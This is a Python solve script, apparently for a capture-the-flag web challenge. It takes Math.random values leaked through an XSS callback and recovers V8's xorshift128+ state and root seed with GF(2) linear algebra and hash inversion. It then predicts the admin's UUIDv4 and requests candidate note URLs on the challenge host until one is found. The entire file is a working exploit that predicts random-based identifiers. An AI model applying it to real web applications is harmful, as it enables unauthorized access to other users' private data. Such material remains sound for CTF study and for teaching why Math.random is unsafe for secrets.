# insert numbers from xss callback here
NUMBERS1 = [0.6895963843546393,0.9233654420197914,0.5116231283488728,0.27029802448375007]
NUMBERS2 = [0.9151567929560229,0.6189343799473936,0.9909685298442512,0.29337312693103934]

MASK = 0xffffffffffffffff

def init_state():
    mtx = [[0]*i + [1] + [0]*(127-i) for i in range(128)]
    return mtx[:64], mtx[64:]

def shl_sym(mtx, n):
    return mtx[n:] + [[0]*128]*n

def shr_sym(mtx, n):
    return [[0]*128]*n + mtx[:-n]

def xor_sym(a, b):
    return [[aaa^bbb for aaa, bbb in zip(aa, bb)] for aa, bb in zip(a, b)]

def xs128p_sym(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 = xor_sym(s1, shl_sym(s1, 23))
    s1 = xor_sym(s1, shr_sym(s1, 17))
    s1 = xor_sym(s1, s0)
    s1 = xor_sym(s1, shr_sym(s0, 26))
    return s1

def xs128p(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 ^= (s1 << 23) & MASK
    s1 ^= (s1 >> 17)
    s1 ^= s0
    s1 ^= (s0 >> 26)
    return s1

def mh(h):
    h ^= h >> 33
    h = (h * 0xFF51AFD7ED558CCD) & MASK
    h ^= h >> 33
    h = (h * 0xC4CEB9FE1A85EC53) & MASK
    h ^= h >> 33
    return h

def mh_inv(h):
    h ^= h >> 33
    h = (h * 0x9cb4b2f8129337db) & MASK
    h ^= h >> 33
    h = (h * 0x4f74430c22a54005) & MASK
    h ^= h >> 33
    return h

def bits_to_int(bits: list[bool]) -> int:
    return int("".join(map(str, map(int, bits))), 2)

def int_to_bits(n, length):
    return [((n >> (length - i - 1)) & 1) for i in range(length)]

def reverse17(val):
    return val ^ (val >> 17) ^ (val >> 34) ^ (val >> 51)

def reverse23(val):
    return (val ^ (val << 23) ^ (val << 46)) & MASK

def xs128p_backward(s0, s1):
    prev_s0 = s1 ^ (s0 >> 26)
    prev_s0 = prev_s0 ^ s0
    prev_s0 = reverse17(prev_s0)
    prev_s0 = reverse23(prev_s0)
    return prev_s0

def state_to_double(s0: int) -> float:
    import struct
    double_bits = (s0 >> 12) | 0x3FF0000000000000
    return struct.unpack("d", struct.pack("<Q", double_bits))[0] - 1

def get_mantissa(val: float) -> int:
    import struct
    if val == 1.0:
        return MASK >> 12
    return struct.unpack("<Q", struct.pack("d", val + 1))[0] & 0x000FFFFFFFFFFFFF

def validate_solution_v8(s0, s1, count=128):
    for _ in range(count):
        if mh(s0^MASK) == s1:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def validate_solution_mr(s0, s1, count=128):
    for _ in range(count):
        if mh_inv(s0) == mh_inv(s1)^MASK:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def solve_basic_state(A, b):
    from sage.all import matrix, vector, GF
    F = GF(2)
    mtx = matrix(F, A)
    vec = vector(F, b)

    sol = mtx.solve_right(vec)
    return bits_to_int(sol[:64]), bits_to_int(sol[64:])

def solve_math_random(numbers):
    s0, s1 = init_state()

    A = []
    b = []
    for n in numbers[::-1]:
        A += s0[:52]
        b += int_to_bits(get_mantissa(n), 52)
        s0, s1 = s1, xs128p_sym(s0, s1)
        
    s0, s1 = solve_basic_state(A, b)
    return validate_solution_mr(s0, s1)

def get_root_init_bits(consecutive_seeds):
    return list(b"".join(seed.to_bytes(8, "little") for seed in consecutive_seeds))

def solve_root_state(consecutive_seeds):
    outputs = get_root_init_bits(consecutive_seeds)
    from tqdm import tqdm
    import itertools

    A = []
    s0, s1 = init_state()
    for _ in range(16):
        A += s0[:8]
        A += s1[:8]
        s0, s1 = s1, xs128p_sym(s0, s1)

    from sage.all import Matrix, vector, GF
    A = Matrix(GF(2), A)

    # 256 values of s0 guesses + 16 carry bits
    attempts = itertools.product(*([range(256)] + [(0, 1)]*16)) 

    b = vector(GF(2), [0]*256)

    for values in tqdm(list(attempts)):
        s0_guess = values[0]
        carry_bits = values[1:]
        
        s0_val = s0_guess

        for i, (o, c) in enumerate(zip(outputs, carry_bits)):
            s1_val = (o - s0_val - c) % 256
            b[i*16:i*16+8] = int_to_bits(s0_val, 8)
            b[i*16+8:i*16+16] = int_to_bits(s1_val, 8)
            s0_val = s1_val # new s0 is old s1

        try:
            sol = A.solve_right(b)
            sol = bits_to_int(sol)
            s0, s1 = sol >> 64, sol & MASK
            if seed := validate_solution_v8(s0, s1):
                return seed
        except ValueError:
            # no solution
            pass

def iter_math_random(seed):
    s0, s1 = mh(seed), mh(seed^MASK)
    while True:
        block = []
        for _ in range(64):
            s0, s1 = s1, xs128p(s0, s1)
            block.append(state_to_double(s0))
        yield from block[::-1]

def generate_uuid(numbers_iter):
    uuid = ""
    for i in range(32):
        if i == 12:
            uuid += "4"
            continue
        char = int(next(numbers_iter) * 16)
        if i == 16:
            char = char & 0x3 | 0x8
        uuid += "0123456789abcdef"[char]
        if i in [7, 11, 15, 19]:
            uuid += "-"
    return uuid

def iter_random_seeds(root_seed):
    s0 = mh(root_seed)
    s1 = mh(s0^MASK)

    output_bytes = []
    for _ in range(128):
        output = ((s0+s1) & MASK) >> 56
        output_bytes.append(output)
        s0, s1 = s1, xs128p(s0, s1)

        if len(output_bytes) >= 8:
            yield int.from_bytes(output_bytes[-8:], "little")

if __name__ == "__main__":
    seed1 = solve_math_random(NUMBERS1)
    print(f"random seed 1: {seed1}")
    seed2 = solve_math_random(NUMBERS2)
    print(f"random seed 2: {seed2}")
    root = solve_root_state([seed1, seed2])
    if not root:
        # order sometimes flipped, try both?
        root = solve_root_state([seed2, seed1])
    print(f"root seed: {root}")

    if not root:
        print("couldn't find root state")
        exit()

    for possible_admin_seed in iter_random_seeds(root):
        uuid = generate_uuid(iter_math_random(possible_admin_seed))

        import requests
        r = requests.get(f"https://notes-spukhafte.chal-kalmarc.tf/note/{uuid}")
        if r.status_code == 200:
            print(uuid, r.text)
            break